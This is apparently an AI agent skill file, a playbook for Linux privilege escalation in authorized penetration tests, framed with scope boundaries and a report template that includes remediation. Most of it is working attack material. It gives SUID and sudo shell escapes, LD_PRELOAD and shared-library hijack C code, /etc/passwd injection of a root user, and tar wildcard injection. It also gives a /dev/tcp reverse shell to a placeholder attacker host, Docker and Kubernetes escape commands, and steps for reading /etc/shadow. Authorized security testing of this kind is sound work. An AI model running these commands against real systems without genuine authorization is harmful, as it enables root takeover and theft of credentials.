---
name: privesc-linux
description: "Invoke this skill when the task requires escalating privileges on a Linux system under authorized engagement: SUID/SGID binary abuse, sudo misconfigurations, kernel exploits, cron job hijacking, Linux capabilities, writable path injection, NFS misconfiguration, container escapes (Docker/Kubernetes), and wildcard injection. Covers both automated enumeration (linpeas, pspy) and manual techniques, with mandatory root-access proof."
---

# Linux Privilege Escalation

This skill covers the full lifecycle of local privilege escalation on Linux systems under an **authorized** engagement. The goal is to escalate from an unprivileged shell to root (or equivalent), documenting every step for reproducibility. A finding is confirmed only when elevated access is demonstrated (e.g., reading `/etc/shadow`, writing to a root-owned path, or executing commands as root).

## Boundaries

| Allowed | Prohibited |
|---|---|
| Enumerating system configuration, permissions, and running processes | Testing systems outside the authorized scope |
| Exploiting misconfigurations to escalate to root | Kernel exploits on production systems without explicit written approval |
| Reading sensitive files as proof of root access | Exfiltrating credentials or data beyond proof artifacts |
| Installing persistence mechanisms in lab/test environments only | Installing backdoors, rootkits, or persistent access on production systems |
| Container escape proof-of-concept on authorized containers | Lateral movement to other systems without explicit scope authorization |
| Running enumeration tools (linpeas, pspy, linux-exploit-suggester) | Running DoS or crash-inducing exploits on production |
| Modifying cron jobs, services, or binaries owned by the tester's test user | Modifying system files that could break the target system |

## Phase 0: Initial access characterization

Before escalating, understand the current position.

```bash
# Identity
id
whoami
groups

# System info
uname -a
cat /etc/os-release
hostnamectl 2>/dev/null

# Architecture
arch
dpkg --print-architecture 2>/dev/null

# Is this a container?
cat /proc/1/cgroup 2>/dev/null | grep -qiE 'docker|lxc|kubepods' && echo "Container detected"
ls -la /.dockerenv 2>/dev/null && echo "Docker container"
cat /proc/self/mountinfo 2>/dev/null | grep -q '/docker/' && echo "Docker container"

# Kernel version (for exploit matching)
uname -r
cat /proc/version
```

Record all output in `work/privesc-linux/enum/`.

## Phase 1: Automated enumeration

### 1.1 linpeas

```bash
# Download (if not available locally)
curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh

# Run with output saved
/tmp/linpeas.sh -a 2>&1 | tee work/privesc-linux/enum/linpeas-output.txt

# Key sections to review:
# - [+] SUID
# - [+] Sudo version / sudo -l
# - [+] Capabilities
# - [+] Writable folders / files
# - [+] Cron jobs
# - [+] Interesting files
```

### 1.2 pspy (process monitoring)

```bash
# Monitor processes without root (catches cron jobs, service restarts)
curl -sL https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -o /tmp/pspy
chmod +x /tmp/pspy
/tmp/pspy -i 1000 2>&1 | tee work/privesc-linux/enum/pspy-output.txt
# Let it run for 5+ minutes to catch periodic tasks
```

### 1.3 linux-exploit-suggester

```bash
curl -sL https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -o /tmp/les.sh
chmod +x /tmp/les.sh
/tmp/les.sh 2>&1 | tee work/privesc-linux/enum/les-output.txt
```

Review automated output, then proceed with manual verification of each lead.

## Phase 2: SUID/SGID binary abuse

### 2.1 Discovery

```bash
# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null | sort | tee work/privesc-linux/enum/suid-bins.txt

# Find all SGID binaries
find / -perm -2000 -type f 2>/dev/null | sort | tee work/privesc-linux/enum/sgid-bins.txt

# Compare against GTFOBins
# Key SUID binaries to check:
# nmap, vim, find, bash, more, less, nano, cp, mv, python, perl, ruby, node, php, env, awk, strace, ltrace
```

### 2.2 Exploitation via GTFOBins

For each non-standard SUID binary, check [GTFOBins](https://gtfobins.github.io/) for known escalation paths.

Common examples:

```bash
# find with SUID
find . -exec /bin/sh -p \; -quit

# python with SUID
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# vim with SUID
vim -c ':!/bin/sh'

# env with SUID
env /bin/sh -p

# nmap (old versions with --interactive)
nmap --interactive
!sh

# cp with SUID (overwrite /etc/passwd)
# Generate a password hash and create a new passwd entry
openssl passwd -1 -salt xyz testpass
echo 'newroot:HASH:0:0:root:/root:/bin/bash' >> /tmp/passwd_new
cp /tmp/passwd_new /etc/passwd
```

### 2.3 Custom SUID binaries

For non-standard SUID binaries not in GTFOBins:

```bash
# Check what the binary does
file /path/to/binary
strings /path/to/binary | head -50
ltrace /path/to/binary 2>&1 | head -20
strace /path/to/binary 2>&1 | head -20

# Look for:
# - Calls to system() with relative paths
# - Shared library loading from writable paths
# - Command injection via arguments
# - File read/write operations
```

## Phase 3: Sudo misconfigurations

### 3.1 Enumeration

```bash
# Check sudo privileges
sudo -l

# Check sudo version (for CVE matching)
sudo --version | head -1
```

### 3.2 Common sudo escalation vectors

```bash
# NOPASSWD entries with escalation paths (check GTFOBins for each)
# Example: (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'

# Example: (ALL) NOPASSWD: /usr/bin/find
sudo find / -exec /bin/bash \; -quit

# Example: (ALL) NOPASSWD: /usr/bin/python3
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'

# Example: (ALL) NOPASSWD: /usr/bin/env
sudo env /bin/bash

# Example: (ALL) NOPASSWD: /usr/bin/awk
sudo awk 'BEGIN {system("/bin/bash")}'

# LD_PRELOAD (if env_keep includes LD_PRELOAD)
# Compile a shared library that spawns a shell
cat > /tmp/preload.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    system("/bin/bash -p");
}
EOF
gcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c -nostartfiles
sudo LD_PRELOAD=/tmp/preload.so /usr/bin/allowed_binary
```

### 3.3 Sudo CVEs

| CVE | Sudo versions | Technique |
|---|---|---|
| CVE-2021-3156 (Baron Samedit) | 1.8.2-1.8.31p2, 1.9.0-1.9.5p1 | Heap overflow via `sudoedit -s` |
| CVE-2019-14287 | < 1.8.28 | `sudo -u#-1 /bin/bash` bypasses user restriction |
| CVE-2023-22809 | 1.8.0-1.9.12p1 | `sudoedit` arbitrary file write via EDITOR |

Verify sudo version before attempting CVE exploits. Use lab-tested exploit code only.

## Phase 4: Cron job exploitation

### 4.1 Enumeration

```bash
# System crontabs
cat /etc/crontab
ls -la /etc/cron.*
cat /etc/cron.d/*

# User crontabs (if readable)
crontab -l
ls -la /var/spool/cron/crontabs/ 2>/dev/null

# Use pspy to detect cron jobs not visible in crontab files
# (already running from Phase 1.2)

# Look for scripts called by cron
grep -r '/' /etc/crontab /etc/cron.d/ 2>/dev/null
```

### 4.2 Exploitation vectors

```bash
# Writable cron script
ls -la /path/to/cron-script.sh
# If writable, append: /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'
# Or: cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash

# Writable PATH directory in cron
# If crontab has PATH=/home/user/bin:/usr/bin:... and /home/user/bin is writable
# and the cron command uses a relative path like "backup.sh"
# Create /home/user/bin/backup.sh with escalation payload

# Wildcard injection (tar, rsync, chown)
# If cron runs: tar czf /backup/archive.tar.gz -C /some/dir *
# In /some/dir:
echo '' > '--checkpoint=1'
echo '' > '--checkpoint-action=exec=sh shell.sh'
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh
```

## Phase 5: Linux capabilities

### 5.1 Enumeration

```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null | tee work/privesc-linux/enum/capabilities.txt
```

### 5.2 Dangerous capabilities

| Capability | Escalation |
|---|---|
| `cap_setuid+ep` | Binary can call `setuid(0)` to become root |
| `cap_setgid+ep` | Binary can call `setgid(0)` |
| `cap_dac_read_search+ep` | Binary can read any file (read `/etc/shadow`) |
| `cap_dac_override+ep` | Binary can write any file |
| `cap_net_raw+ep` | Packet sniffing (credential capture) |
| `cap_sys_admin+ep` | Mount filesystems, trace processes, broad kernel access |
| `cap_sys_ptrace+ep` | Attach to and inject into running processes |

```bash
# Example: python3 with cap_setuid
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Example: vim with cap_dac_read_search
vim /etc/shadow

# Example: tar with cap_dac_read_search
tar czf /tmp/shadow.tar.gz /etc/shadow
tar xzf /tmp/shadow.tar.gz -C /tmp/
cat /tmp/etc/shadow
```

## Phase 6: Writable paths and file permission abuse

### 6.1 World-writable directories in PATH

```bash
# Check PATH for writable directories
echo $PATH | tr ':' '\n' | while read dir; do
  [ -w "$dir" ] && echo "WRITABLE: $dir"
done

# If a root-owned script or service calls a command without full path
# and a writable directory appears earlier in PATH, create a malicious binary there
```

### 6.2 Writable sensitive files

```bash
# /etc/passwd writable?
ls -la /etc/passwd
# If writable, add a root-equivalent user:
openssl passwd -1 -salt xyz testpass
echo 'newroot:$1$xyz$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd

# /etc/shadow writable?
ls -la /etc/shadow

# Writable service files
find /etc/systemd/system/ -writable -type f 2>/dev/null
find /etc/init.d/ -writable -type f 2>/dev/null

# Writable library paths
find /usr/lib/ -writable -type f 2>/dev/null
find /usr/local/lib/ -writable -type f 2>/dev/null
ldconfig -p | grep -v "^$" | head -20
```

### 6.3 Shared library hijacking

```bash
# Find binaries with missing shared libraries
ldd /path/to/suid-binary 2>&1 | grep "not found"

# If a SUID binary loads a library from a writable path:
# 1. Compile a malicious .so
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
void __attribute__((constructor)) init() {
    setuid(0);
    system("/bin/bash -p");
}
EOF
gcc -fPIC -shared -o /writable/path/libmissing.so /tmp/evil.c
# 2. Run the SUID binary
```

## Phase 7: Kernel exploits

**WARNING**: Kernel exploits can crash the system. Use on production only with explicit written authorization. Prefer lab testing first.

### 7.1 Version matching

```bash
uname -r
# Cross-reference with linux-exploit-suggester output from Phase 1.3
```

### 7.2 Notable kernel CVEs

| CVE | Kernel versions | Name |
|---|---|---|
| CVE-2022-0847 | 5.8 - 5.16.11 | DirtyPipe |
| CVE-2021-4034 | Any with polkit (pkexec) | PwnKit |
| CVE-2022-2588 | 5.1 - 5.19 | route4 use-after-free |
| CVE-2021-3493 | Ubuntu-specific, < 5.11 | OverlayFS |
| CVE-2016-5195 | < 4.8.3 | DirtyCow |
| CVE-2022-34918 | 5.8 - 5.18.9 | Netfilter nft_set |

### 7.3 Exploitation protocol

1. Match kernel version to candidate CVEs.
2. Download a known-good exploit from a trusted source (GitHub PoC repos with star count and review).
3. Compile on the target or cross-compile locally.
4. **On production**: get explicit confirmation before executing.
5. Execute, capture proof of root access, then clean up artifacts.

## Phase 8: Container escapes

### 8.1 Docker escape vectors

```bash
# Check if running in Docker
cat /proc/1/cgroup | grep docker
ls -la /.dockerenv

# Privileged container check
ip link add dummy0 type dummy 2>/dev/null && echo "PRIVILEGED" && ip link del dummy0
cat /proc/self/status | grep CapEff
# CapEff: 000001ffffffffff = all capabilities = privileged

# Privileged container escape via /dev
# If privileged, mount the host filesystem:
mkdir /tmp/host
mount /dev/sda1 /tmp/host
ls /tmp/host/root/

# Docker socket mounted
ls -la /var/run/docker.sock
# If accessible:
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host

# Writable cgroup escape (CVE-2022-0492)
# Check cgroup v1 mount
mount | grep cgroup
# If cgroupfs is writable and release_agent is settable, the container can execute on the host
```

### 8.2 Kubernetes escape

```bash
# Service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

# Check API access
curl -sk https://kubernetes.default.svc/api/ -H "Authorization: Bearer $TOKEN"

# Can we create pods? (escalation to node)
curl -sk https://kubernetes.default.svc/api/v1/namespaces/default/pods \
  -H "Authorization: Bearer $TOKEN"

# Check RBAC permissions
curl -sk https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"create","resource":"pods"}}}'
```

## Phase 9: NFS and miscellaneous vectors

### 9.1 NFS no_root_squash

```bash
# Check NFS exports
cat /etc/exports 2>/dev/null
showmount -e TARGET_IP 2>/dev/null

# If no_root_squash is set on a share:
# From attacker machine (as root):
mount -t nfs TARGET_IP:/share /mnt/nfs
cp /bin/bash /mnt/nfs/rootbash
chmod +s /mnt/nfs/rootbash
# On target:
/share/rootbash -p
```

### 9.2 Additional vectors

- [ ] **SSH keys**: writable `~/.ssh/authorized_keys` for root or other privileged users.
- [ ] **History files**: passwords in `.bash_history`, `.mysql_history`, `.psql_history`.
- [ ] **Config files**: database credentials in `/var/www/*/config*`, `.env` files, application configs.
- [ ] **Writable /etc/ld.so.conf.d/**: inject a library path and run `ldconfig`.
- [ ] **Tmux/screen sessions**: attach to root-owned sessions (`tmux ls`, `screen -ls`).
- [ ] **Dbus/Polkit**: misconfigured polkit rules allowing unprivileged actions.
- [ ] **Writable systemd timers or services**: inject commands into service definitions.

## Verification requirements

A finding is **confirmed** only when ALL of the following are met:

1. **Root access proof**: at least one of:
   - Output of `id` showing `uid=0(root)` or `euid=0(root)`.
   - Contents of `/etc/shadow` (first 2 lines sufficient as proof).
   - File written to a root-only directory (`/root/proof.txt`).
   - Command executed as root (`whoami` returning `root`).
2. **Replayable steps**: a numbered sequence of commands that reproduces the escalation from the initial shell to root.
3. **Technique classification**: the specific vector (SUID binary name, sudo rule, CVE number, cron job path, capability) is documented.
4. **Environment context**: kernel version, OS release, and relevant configuration (the specific misconfiguration that enables the escalation).
5. **No collateral damage**: the escalation did not crash services, corrupt data, or leave persistent modifications on production systems.

## Output format

```markdown
## Privilege Escalation Finding: [technique name]

**Severity**: Critical / High
**Vector**: SUID abuse / sudo misconfiguration / kernel exploit / cron hijack / capability / container escape
**Initial access**: www-data (uid=33) via web shell
**Escalated to**: root (uid=0)

### Vulnerable configuration
- **Misconfiguration**: `/usr/bin/python3` has SUID bit set (`-rwsr-xr-x`)
- **System**: Ubuntu 22.04, kernel 5.15.0-91-generic
- **How it was found**: `find / -perm -4000 -type f 2>/dev/null` output

### Exploitation steps
1. Identified SUID python3: `ls -la /usr/bin/python3` -> `-rwsr-xr-x 1 root root`
2. Executed: `python3 -c 'import os; os.setuid(0); os.system("/bin/bash -p")'`
3. Verified: `id` -> `uid=0(root) gid=33(www-data)`
4. Proof: `head -2 /etc/shadow` -> `root:$y$j9T$...`

### Proof of root access
\```
$ id
uid=0(root) gid=33(www-data) groups=33(www-data)
$ whoami
root
$ head -2 /etc/shadow
root:$y$j9T$REDACTED:19500:0:99999:7:::
daemon:*:19500:0:99999:7:::
\```

### Impact
- Full root access on the host from any local user.
- Access to all user credentials, SSH keys, and application secrets.
- Ability to modify system configuration, install persistence, and pivot to networked systems.

### Remediation
- Remove SUID bit from python3: `chmod u-s /usr/bin/python3`.
- Audit all SUID/SGID binaries against a known-good baseline.
- Implement file integrity monitoring for permission changes on system binaries.
```

## Completion self-check

- [ ] Automated enumeration (linpeas, pspy) output is saved and reviewed.
- [ ] Every SUID/SGID binary has been checked against GTFOBins.
- [ ] `sudo -l` output is analyzed and every entry tested for escalation.
- [ ] Cron jobs (visible and hidden via pspy) are enumerated and checked for writable scripts or PATH abuse.
- [ ] Capabilities are enumerated and dangerous ones tested.
- [ ] Kernel version is matched against known CVEs.
- [ ] Container escape is tested if running in a container.
- [ ] Every confirmed finding has root-access proof and replayable steps.
- [ ] No persistent modifications remain on the target (cleanup verified).
